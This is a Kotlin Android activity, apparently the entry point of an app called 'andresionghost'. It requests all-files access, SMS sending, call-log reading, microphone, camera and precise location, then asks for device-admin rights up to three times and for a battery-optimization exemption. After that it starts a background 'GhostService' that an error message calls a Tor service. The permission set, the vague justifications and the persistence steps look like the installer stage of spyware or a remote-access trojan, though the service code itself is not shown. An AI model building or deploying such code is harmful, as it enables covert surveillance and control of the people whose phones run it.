package com.example.andresionghost

import android.Manifest
import android.annotation.SuppressLint
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {

    private lateinit var externalStorageLauncher: ActivityResultLauncher<Intent>
    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private lateinit var adminLauncher: ActivityResultLauncher<Intent>
    private lateinit var batteryOptimizationLauncher: ActivityResultLauncher<Intent>

    private var deviceAdminRequestCount = 0
    private val MAX_DEVICE_ADMIN_REQUESTS = 3

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize all ActivityResultLaunchers
        initializeLaunchers()

        // Start the permission request flow
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                requestManageExternalStoragePermission()
            } else {
                requestOtherPermissions()
            }
        } else {
            requestOtherPermissions()
        }
    }

    /**
     * Initializes all ActivityResultLaunchers used in the permission flow.
     */
    private fun initializeLaunchers() {
        // Launcher for Manage External Storage permission
        externalStorageLauncher =
            registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (Environment.isExternalStorageManager()) {
                        // Permission granted, proceed to request other permissions
                        requestOtherPermissions()
                    } else {
                        showPermissionDeniedDialog("External Storage")
                    }
                }
            }

        // Launcher for requesting multiple permissions
        permissionLauncher =
            registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
                if (permissions.all { it.value }) {
                    // All permissions granted, proceed to handle Device Admin
                    handleDeviceAdminRequest()
                } else {
                    // Gracefully handle denied permissions
                    showPermissionDeniedDialog("Required Permissions")
                }
            }

        // Launcher for Device Admin permission
        adminLauncher =
            registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                if (isDeviceAdminActive()) {
                    // Device Admin granted, proceed to disable battery optimizations
                    checkAndRequestBackgroundRunning()
                } else {
                    deviceAdminRequestCount++
                    if (deviceAdminRequestCount < MAX_DEVICE_ADMIN_REQUESTS) {
                        showPermissionDeniedDialog("Device Admin")
                    } else {
                        Toast.makeText(
                            this,
                            "Device admin not granted. Some features may not work properly.",
                            Toast.LENGTH_LONG
                        ).show()
                        // Proceeding without Device Admin
                        checkAndRequestBackgroundRunning()
                    }
                }
            }

        // Launcher for Battery Optimization settings
        batteryOptimizationLauncher =
            registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                // After user responds to battery optimization request, initialize the app
                initializeApp()
            }
    }

    /**
     * Requests Manage External Storage permission by launching the appropriate settings intent.
     */
    private fun requestManageExternalStoragePermission() {
        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
            data = android.net.Uri.parse("package:$packageName")
        }
        externalStorageLauncher.launch(intent)
    }

    /**
     * Requests the array of other necessary permissions based on Android version.
     */
    private fun requestOtherPermissions() {
        val permissions = getRequiredPermissions()
        permissionLauncher.launch(permissions)
    }

    /**
     * Defines the required permissions based on the device's Android version.
     */
    private fun getRequiredPermissions(): Array<String> {
        return when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> {
                arrayOf(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.CAMERA,
                    Manifest.permission.ACCESS_FINE_LOCATION
                )
            }

            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                arrayOf(
                    Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.CAMERA,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.INTERNET
                )
            }

            else -> {
                arrayOf(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.CAMERA,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.INTERNET
                )
            }
        }
    }

    /**
     * Handles the Device Admin permission request flow.
     */
    private fun handleDeviceAdminRequest() {
        if (isDeviceAdminActive()) {
            checkAndRequestBackgroundRunning()
        } else {
            requestDeviceAdmin()
        }
    }

    /**
     * Requests Device Admin privileges by launching the appropriate intent.
     */
    private fun requestDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(
                DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(this@MainActivity, MyDeviceAdminReceiver::class.java)
            )
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "App requires device admin rights to function properly."
            )
        }
        adminLauncher.launch(intent)
    }

    /**
     * Checks if the app currently has Device Admin privileges.
     */
    private fun isDeviceAdminActive(): Boolean {
        val devicePolicyManager =
            getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return devicePolicyManager.isAdminActive(
            ComponentName(
                this,
                MyDeviceAdminReceiver::class.java
            )
        )
    }

    /**
     * Disables battery optimizations to ensure the app runs smoothly in the background.
     */
    @SuppressLint("BatteryLife")
    private fun disableBatteryOptimization() {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        batteryOptimizationLauncher.launch(intent)
    }

    /**
     * Initializes the app by starting necessary services after all permissions are granted.
     */
    private fun initializeApp() {
        // Final check for Manage External Storage permission (for Android R and above)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            requestManageExternalStoragePermission()
            Toast.makeText(this, "Please grant all files access permission.", Toast.LENGTH_SHORT)
                .show()
            return
        }
        // Start the Ghost Service
        startGhostService()
    }

    /**
     * Starts the Ghost Service.
     */
    private fun startGhostService() {
        try {
            val serviceIntent = Intent(this, GhostService::class.java)
            ContextCompat.startForegroundService(this, serviceIntent)
        } catch (e: Exception) {
            Toast.makeText(this, "Failed to start Tor service: ${e.message}", Toast.LENGTH_SHORT)
                .show()
            e.printStackTrace()
        }
    }

    /**
     * Displays a dialog informing the user that a specific permission is required.
     *
     * @param permissionType The type of permission that was denied.
     */
    private fun showPermissionDeniedDialog(permissionType: String) {
        AlertDialog.Builder(this)
            .setTitle("Permission Denied")
            .setMessage("The app requires $permissionType to function properly.")
            .setPositiveButton("OK") { _, _ -> }
            .setNegativeButton("Settings") { _, _ ->
                // Direct user to app settings for manual permission adjustments
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
            .setCancelable(false)
            .show()
    }

    /**
     * Checks for background running permission and manages the app's optimization settings.
     */
    private fun checkAndRequestBackgroundRunning() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !powerManager.isIgnoringBatteryOptimizations(packageName)) {
            disableBatteryOptimization()
        } else {
            initializeApp()
        }
    }
}
